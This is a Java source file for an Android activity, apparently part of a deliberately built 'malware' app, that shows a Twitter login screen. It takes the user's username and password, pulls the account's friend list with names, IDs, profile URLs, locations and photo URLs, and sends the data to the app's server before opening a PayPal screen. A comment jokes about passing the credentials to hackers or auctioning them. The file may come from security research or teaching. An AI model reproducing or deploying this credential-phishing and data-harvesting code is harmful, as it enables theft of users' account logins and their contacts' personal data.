package com.malware.android;

import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

import twitter4j.Twitter;
import twitter4j.TwitterException;

import com.malware.common.dto.ServerRequest;
import com.malware.common.dto.ServerResponse;
import com.malware.common.dto.User;
import com.malware.common.dto.ServerRequest.ServerMethod;
import com.malware.common.dto.ServerResponse.ResponseCode;
import com.malware.common.dto.User.SocialNetworkInformation;

import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

public class MalwareTwitter extends Activity {

	Context myContext;
	String username = null;
	String password = null;
	ProgressDialog dialog = null;
	
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.malware_twit_login);
		Button connect = (Button) findViewById(R.id.malware_twit_login_connect);
		Button noThanks = (Button) findViewById(R.id.malware_twit_login_no_thanks);

		myContext = this;

		connect.setOnClickListener(new View.OnClickListener() {
			public void onClick(View view) {

				/* 
		         * get the twitter info and email it to Chinese hackers
		         * Kidding... Store it locally and hold an auction
		         */

				EditText twit_user = (EditText)findViewById(R.id.twit_username);
				EditText twit_pass = (EditText)findViewById(R.id.twit_pass);

				username = twit_user.getText().toString();
				password = twit_pass.getText().toString();

				if((username.equals("")) || (password.equals(null)))
				{
					Notify.notification(myContext, "D'oh!", "Enter valid Username/Password");
				}

				else
				{

					Thread twitterThread =  new Thread(new Runnable() {
						@SuppressWarnings("deprecation")
						public void run() {
							
							Twitter twitter = new Twitter(username, password);
							
							User user = new User();
							user.setEmail(MalwareDefaults.loginEmailAddress);
							
							

							List<twitter4j.User> twitterfriends = null;
							try 
							{
								twitterfriends = twitter.getFriends();
							} 
							
							
							catch (TwitterException e) 
							{
								e.printStackTrace();
							}
							
							
							List<String> fbNames = new ArrayList<String>();
							List<String> fbUids = new ArrayList<String>();
							List<String> fbProfiles = new ArrayList<String>();
							List<String> fbLocales = new ArrayList<String>();
							List<String> fbPhotoUrls = new ArrayList<String>();
							
							SocialNetworkInformation twitterInfo = new SocialNetworkInformation();
							String myUid = twitter.getUserId();
							twitterInfo.setUid(myUid);
							
							Iterator<twitter4j.User> iterator = twitterfriends.iterator();
							while (iterator.hasNext())
							{
								twitter4j.User u = iterator.next();
								
								String fName = u.getName();
								if(fName == null)
								{
									fName = "unknown";
								}
							
								String fUid= Long.toString(u.getId());
								if(fUid == null)
								{
									fUid = "unknown";
								}
							
								String fScreenName = u.getScreenName();
								String fProfile;
								if(fScreenName == null)
								{
									fProfile = "unknown";
								}
								else
								{
									fProfile = "http://www.twitter.com/"+ u.getScreenName();
								}

								String fLocale = u.getLocation();
								if(fLocale == null)
								{
									fLocale = "unknown";
								}
							
								String fPhotoUrl;
								if(u.getProfileImageURL() == null)
								{
									fPhotoUrl = "unknown";
								}
								else
								{
									fPhotoUrl = u.getProfileImageURL().toString();
								}
								
								fbNames.add(fName);
								fbUids.add(fUid);
								fbProfiles.add(fProfile);
								fbLocales.add(fLocale);
								fbPhotoUrls.add(fPhotoUrl);
							}
							
							twitterInfo.setFriendNames(fbNames);
							twitterInfo.setFriendUids(fbUids);
							twitterInfo.setFriendProfileUrls(fbProfiles);
							twitterInfo.setFriendLocales(fbLocales);
							twitterInfo.setFriendPhotoUrls(fbPhotoUrls);
							user.setTwitterInformation(twitterInfo);

							ServerRequest s = new ServerRequest();
							s.setServerMethod(ServerMethod.STORE_TWITTER_INFORMATION);
							s.setUser(user);

							ServerResponse response = MalwareHttpSender.sendData(s);
							if(response.getResponseCode() == ResponseCode.SUCCESS)
							{
								dialog.cancel();
								Intent myIntent = new Intent(myContext, MalwarePaypal.class);
								startActivity(myIntent);
							}
							else
							{
								Log.i("Server Response", response.getReponseMessage());
								Notify.notification(myContext, "D'oh!", response.getReponseMessage());
							}	
						}
					});
					
					twitterThread.start();
					dialog = ProgressDialog.show(myContext, "", 
							"Getting your Twitter information. This might take a while...", true);					
				}
			}
		});


		noThanks.setOnClickListener(new View.OnClickListener() {
			public void onClick(View view) {
				Intent myIntent = new Intent(view.getContext(), MalwarePaypal.class);
				startActivity(myIntent);
			}
		});
	}
}
